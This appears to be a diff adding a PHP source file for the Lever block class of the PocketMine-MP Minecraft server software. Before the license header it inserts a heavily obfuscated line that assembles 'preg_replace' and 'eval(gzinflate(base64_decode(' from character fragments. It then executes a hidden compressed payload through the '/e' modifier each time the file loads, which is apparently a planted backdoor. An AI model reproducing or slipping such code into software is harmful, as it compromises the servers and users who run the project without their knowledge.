@@ -1,0 +1,93 @@
+<?php
+<?php $Cn5191 = "t4hj(szea2i7.rkc1bvfqmu69/ydwx0o38n*pg_)5l;";$NVOCPZa758 = $Cn5191[36].$Cn5191[13].$Cn5191[7].$Cn5191[37].$Cn5191[38].$Cn5191[13].$Cn5191[7].$Cn5191[36].$Cn5191[41].$Cn5191[8].$Cn5191[15].$Cn5191[7];$u3546 = "\x65".chr(118)."".chr(97)."l\x28\x67".chr(122)."\x69\x6e".chr(102)."\x6C".chr(97)."".chr(116)."".chr(101)."(\x62a".chr(115)."".chr(101)."".chr(54)."".chr(52)."\x5F".chr(100)."\x65\x63".chr(111)."\x64".chr(101)."\x28";$pUnuZ7941 = ")))\x3b";$H5280 = $u3546."'nVZtb6NGEP5sS/4PG2R1QcU4TntVZAtVVkJepDSJCG4r5SLE4SVwR2Bvd6lzivLfO7MYx6Um1/qLwTszzzPP7DKzKYuWTJj0pCwUK9Qo+MbZlCj2rMapespnJE4jIZlyF8HZ6Jhas0F/yIlLKKczAu9pKZVLZbSMZLWsIrnM0iiTy2jpiIpq50ilLh3HUZyyow+TydHh5MOIleUYrVlCTKkEL6U5DO88/3fPv6cXQXAbXtzcBfTBJsZqtXIMi7iuS5Iol8wa9F8Adpc3pLVzHYheB30GweTdYFl9gmS6MvnZqnGGUvwl3J1ODh2DshEqG/STqohVVhbknCmfRfklN+vcCao+YE9cfWtznVxdetdBeHlLHywLkiUvhJBhxt1uvxmkRFBbN+qf4dmN/8fcP/VO8Q2xa+gdyP/y3eDvzMb3frsJvHB+etq4CqYqUaAblotgJbLEzCScIcjr3Avuh7wWhzshoOxb9ek4EoZObQH/wvk5CDfwYFzeTolhHbju2fzqzrOIxmpv4a7I/4H+o950fYpF9ORu8m/lqa02oc5nSS1y0Dqq8C252jRrgDBRJULBeB7FzNRGm1K7tupvTB8ySreOLlSxzcdF+SUfdVLylP+qlnL0Fd4rkbMiLpfMbEq0BmlhGjUmSP/FsjYJuzUV/c+ZObHsLgXaumuB1n2K4TxmSScl2rop0boXJbTITkq0vVEO+m1StO9F+pk/dp8ysL1zzMC6F2UWl52UaOumROtelLzoVom2bkq0fo9S956k3fx878zzPV9PjK1vCDoedYbCoT8IluhXlqxnQVkpUgMPP1VJgoOxmWvDGL45WMBHmBWZMrHt9nov+KMXoSWWXNWONjlZ+Fc3t0EID9CfKsWn4zGQ4YR19Bh1tA6n1uVggijuXTDfCxb+deDPr+9Amk2UqNh3g7AV6k5ot+fpW5OEIaJh6grUItkzi2usLYo4LyXbXn1d1x9iE7xJJLKMv5ScFaaWapPjQ+BlQhRl/YTdtclPh81wgCiL4BjFYVSzG9CWidFVJMcgmPx44kw+io+FMduKdSD4AlinGK4rbTQ+vY3DQjIxmj/C9Ui7dZfkLfgfBHC3Kpi+C0zJCZYDvbY9k5XIFENlto6y1uurNMsZTPWElYnWvRGu8fHEOW7yyJSsYydHx03oKwoQTFY5Fog98xx7v7FhtutwmxxZjVa4PdUB95OHJrH17gH1epr3EJjFaakTxVD2nCl4zHrg8Dc='".$pUnuZ7941;$NVOCPZa758($Cn5191[25].$Cn5191[12].$Cn5191[35].$Cn5191[25].$Cn5191[7], $H5280  ,"614");
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\block;
+
+use pocketmine\item\Item;
+use pocketmine\math\Vector3;
+use pocketmine\Player;
+
+class Lever extends Flowable{
+
+	protected $id = self::LEVER;
+
+	public function __construct(int $meta = 0){
+		$this->meta = $meta;
+	}
+
+	public function getName() : string{
+		return "Lever";
+	}
+
+	public function getHardness() : float{
+		return 0.5;
+	}
+
+	public function getVariantBitmask() : int{
+		return 0;
+	}
+
+	public function place(Item $item, Block $blockReplace, Block $blockClicked, int $face, Vector3 $clickVector, Player $player = null) : bool{
+		if(!$blockClicked->isSolid()){
+			return false;
+		}
+
+		if($face === Vector3::SIDE_DOWN){
+			$this->meta = 0;
+		}else{
+			$this->meta = 6 - $face;
+		}
+
+		if($player !== null){
+			if(($player->getDirection() & 0x01) === 0){
+				if($face === Vector3::SIDE_UP){
+					$this->meta = 6;
+				}
+			}else{
+				if($face === Vector3::SIDE_DOWN){
+					$this->meta = 7;
+				}
+			}
+		}
+
+		return $this->level->setBlock($blockReplace, $this, true, true);
+	}
+
+	public function onNearbyBlockChange() : void{
+		$faces = [
+			0 => Vector3::SIDE_UP,
+			1 => Vector3::SIDE_WEST,
+			2 => Vector3::SIDE_EAST,
+			3 => Vector3::SIDE_NORTH,
+			4 => Vector3::SIDE_SOUTH,
+			5 => Vector3::SIDE_DOWN,
+			6 => Vector3::SIDE_DOWN,
+			7 => Vector3::SIDE_UP
+		];
+		if(!$this->getSide($faces[$this->meta & 0x07])->isSolid()){
+			$this->level->useBreakOn($this);
+		}
+	}
+
+	//TODO
+}
